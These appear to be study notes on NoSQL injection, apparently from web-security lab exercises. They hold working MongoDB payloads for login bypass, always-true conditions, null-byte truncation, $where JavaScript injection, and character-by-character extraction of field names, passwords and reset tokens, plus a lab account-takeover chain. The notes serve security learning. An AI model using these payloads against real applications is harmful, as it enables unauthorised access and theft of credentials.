# NoSQL Injection Notes

## What is NoSQL Injection?
An attack where malicious input manipulates a NoSQL database query to behave in unintended ways. Similar to SQL injection but targets NoSQL databases like MongoDB, CouchDB, Redis.

NoSQL databases accept queries as JSON/BSON objects. The vulnerability arises when user input is embedded directly into query objects without sanitization.

---

## Types of NoSQL Injection

### 1. Syntax Injection
Breaking the query structure using special characters. You inject characters that disrupt the query syntax.

### 2. Operator Injection
Sending a JSON object instead of a string to inject MongoDB operators like `$ne`, `$where`, `$in`, `$regex`. Bypasses string-based checks entirely by changing the data type of input.

---

## Key MongoDB Operators Used in Attacks

| Operator | Meaning | Attack Use |
|---|---|---|
| `$ne` | Not equal | Bypass login/equality checks |
| `$in` | Match any in list | Enumerate valid values |
| `$regex` | Pattern match | Extract data char by char |
| `$where` | Run JavaScript | Most powerful, blind injection |

---

## Detection Process

### Step 1 — Fuzz the Input
Send the MongoDB fuzz string to see if the app reacts differently:
```
'"`{ ;$Foo} $Foo \xYZ
```
URL encoded version:
```
category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
Via JSON body:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Step 2 — Find Which Characters Break the Query
Test a single quote:
```
category='
```
If response changes → `'` is being interpreted → injectable.
Confirm by escaping it:
```
category=\'
```
If no error → vulnerable.

### Step 3 — Test Boolean Logic
```
category=fizzy' && 0 && 'x    ← false → no results
category=fizzy' && 1 && 'x    ← true → normal results
```
Different responses = you can control query logic.

### Step 4 — Override Conditions (Always True)
```
category=fizzy'||'1'=='1
```
Query becomes:
```javascript
this.category == 'fizzy'||'1'=='1'
```
Returns ALL products including hidden ones.

### Step 5 — Null Byte Trick
Cuts off extra query restrictions like `this.released == 1`:
```
category=fizzy'%00
```
Query becomes:
```javascript
this.category == 'fizzy'\u0000' && this.released == 1
```
MongoDB ignores everything after null byte → restriction disappears.

---

## Operator Injection — Testing `$where`

Test if JavaScript is being evaluated:
```json
{"username":"wiener","password":"peter", "$where":"0"}   ← false
{"username":"wiener","password":"peter", "$where":"1"}   ← true
```
Different responses = `$where` is being evaluated → injectable.

---

## Data Exfiltration via `$where`

### Extract Password Character by Character
```
admin' && this.password[0] == 'a' || 'a'=='b
```
- Result returned → character matches ✅
- No result → wrong character, try next ❌

### Use match() for Pattern Testing
```
admin' && this.password.match(/\d/) || 'a'=='b
```
Useful patterns:
```javascript
this.password.match(/\d/)     // contains a number?
this.password.match(/[A-Z]/)  // contains uppercase?
this.password.match(/^c/)     // starts with 'c'?
this.password.match(/.{8}/)   // at least 8 chars long?
```

---

## Field Enumeration via Object.keys()

### Find Number of Fields
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this).length == 5"}
```

### Find Field Name Length
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[0].length == 3"}
```

### Extract Field Names Character by Character
```json
{"username":"carlos","password":{"$ne":""},"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```
- `.{0}` = position 0
- `a` = character being tested
- Increment position number to move to next character
- Increment array index `[0]`, `[1]`, `[2]`... to check next field

### Extract Field Value Character by Character
```json
{"username":"carlos","password":{"$ne":""},"$where":"this.pwResetToken.match('^.{0}a.*')"}
```

---

## Lab: Exploiting NoSQL operator injection to extract unknown fields

### Goal
Log in as `carlos` by extracting his password reset token.

### Attack Chain
1. Confirm `$ne` operator is accepted → get "Account locked" error
2. Confirm `$where` JavaScript injection works → different responses for `0` vs `1`
3. Use Intruder (Cluster bomb) to enumerate field names via `Object.keys(this)`
4. Identify the `pwResetToken` field
5. Use Intruder to extract the token value character by character
6. Use token in `GET /forgot-password?pwResetToken=VALUE`
7. Open in browser via **Request in browser → Original session**
8. Reset password and log in as carlos

### Important Notes
- Token is **time-limited** — use it immediately after extraction
- There are **5 fields** on the user object (indexes 0-4)
- The reset endpoint is `GET /forgot-password?pwResetToken=VALUE`
- Must open the reset link in the **browser**, not just Repeater
